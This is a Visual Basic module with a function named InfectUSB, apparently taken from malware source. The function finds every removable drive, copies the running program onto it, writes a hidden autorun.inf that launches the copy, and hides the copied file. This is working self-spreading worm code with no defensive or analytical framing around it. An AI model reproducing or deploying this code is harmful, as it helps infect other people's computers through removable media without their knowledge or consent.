Attribute VB_Name = "Module8"
Private Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long

Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long

Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewFileName As String, ByVal bFailIfExists As Long) As Long

Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

Private Declare Function SetFileAttributes Lib "kernel32.dll" Alias "SetFileAttributesA" (ByVal lpFileName As String, ByVal dwFileAttributes As Long) As Long

Private Declare Function CreateFile Lib "kernel32" Alias "CreateFileA" (ByVal lpFileName As String, ByVal dwDesiredAccess As Long, ByVal dwShareMode As Long, ByVal lpSecurityAttributes As Long, ByVal dwCreationDisposition As Long, ByVal dwFlagsAndAttributes As Long, ByVal hTemplateFile As Long) As Long

Private Declare Function WriteFile Lib "kernel32" (ByVal hFile As Long, ByVal lpBuffer As Any, ByVal nNumberOfBytesToWrite As Long, lpNumberOfBytesWritten As Long, ByVal lpOverlapped As Long) As Long
   
Private Declare Function CloseHandle Lib "kernel32" (ByVal hHandle As Long) As Long

Const DRIVE_REMOVABLE As Long = 2
Const FILE_ATTRIBUTE_HIDDEN = 2
Const OPEN_ALWAYS = 4
Const GENERIC_WRITE = &H40000000
Const FILE_SHARE_READ = &H1

Private Function GetFileName() As String
    Dim szBuffer As String * 255
    GetModuleFileName 0, szBuffer, Len(szBuffer)
    GetFileName = szBuffer
End Function

Public Function InfectUSB(FileName As String) As Long
    Dim szBuffer As String * 128
    Dim infBuffer As String
    Dim Drive As Variant
    Dim Drives() As String
    hGet = GetLogicalDriveStrings(Len(szBuffer), szBuffer)
    If hGet <> 0 Then
        Drives = Split(szBuffer, Chr(0))
        For Each Drive In Drives
            If GetDriveType(Drive) = DRIVE_REMOVABLE Then
                hCopy = CopyFile(GetFileName, Drive & FileName, 0)
                If hCopy <> 0 Then
                    hFile = CreateFile(Drive & "autorun.inf", GENERIC_WRITE, FILE_SHARE_READ, 0&, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, 0&)
                    If hFile <> 0 Then
                        infBuffer = "[autorun]" & vbCrLf & "open=" & Drive & FileName
                        hWrite = WriteFile(hFile, infBuffer, Len(infBuffer), 0, 0)
                        If hWrite <> 0 Then
                            InfectUSB = InfectUSB + 1
                        End If
                    End If
                    Call SetFileAttributes(Drive & FileName, FILE_ATTRIBUTE_HIDDEN)
                    Call CloseHandle(hFile)
                End If
            End If
        Next Drive
    End If
End Function
